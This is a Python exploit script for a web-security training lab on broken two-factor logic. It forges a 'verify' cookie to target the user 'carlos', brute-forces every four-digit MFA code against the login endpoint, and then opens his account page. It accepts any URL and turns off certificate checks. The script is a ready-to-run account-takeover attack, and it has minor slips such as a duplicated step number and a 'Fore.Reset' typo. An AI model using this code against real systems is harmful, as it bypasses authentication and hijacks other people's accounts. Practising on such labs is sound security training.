"""
  Lab: 2FA broken logic

  Steps:
  1. Login with the valid user wiener:peter
  2. Alter the cookie to target profile 'carlos' and erase the session cookie
  3. Brute force the mfa-code of carlos
  3. Fetch the account page using carlos account

  Author: N00BCYB0T
"""
import argparse
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help="Target URL")
  parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
  args = parser.parse_args()

  print(f"{Fore.BLUE}Starting...{Fore.RESET}")
  session = requests.session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False

  print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Setting account cookie to impersonate carlos...")
  session.cookies.set("verify", "carlos")

  print(f"{Fore.YELLOW}STEP 2:{Fore.RESET} Getting the message code ...")
  session.get(f"{args.url}/login2", allow_redirects=False)

  print(f"{Fore.YELLOW}STEP 3:{Fore.RESET} Starting brute-force on MFA code...")
  success = brute_force_mfa(args.url, session)
  if not success:
    print(f"{Fore.RED}[-] Brute-force failed.{Fore.RESET}")
    exit(1)
    
  print(f"{Fore.YELLOW}STEP 4:{Fore.RESET} Fetching /my-account as carlos...")
  if fetch(args.url, session):
    print(f"{Fore.GREEN}[+] Lab solved successfully!{Fore.RESET}")
  else:
      print(f"{Fore.RED}[-] Failed to access carlos account.{Fore.RESET}")

def brute_force_mfa(url, session):
  for code in range(10000):
    mfa_code = f"{code:04}"
    data = {"mfa-code": mfa_code}
    response = session.post(f"{url}/login2", data, allow_redirects=False)
    print(f"{Fore.CYAN}Trying {mfa_code}...", end='\r')

    if response.status_code == 302:
      print(f"[+] Success with code: {Fore.GREEN}{mfa_code}{Fore.RESET}")
      return response
  return None

def fetch(url, session):
  try:
    response = session.get(f"{url}/my-account?id=carlos", allow_redirects=False)
    return response
  except ValueError as e:
    print(f"{Fore.RED}Error{Fore.Reset}: {e}")
    exit(1)
  
if __name__ == "__main__":
  main()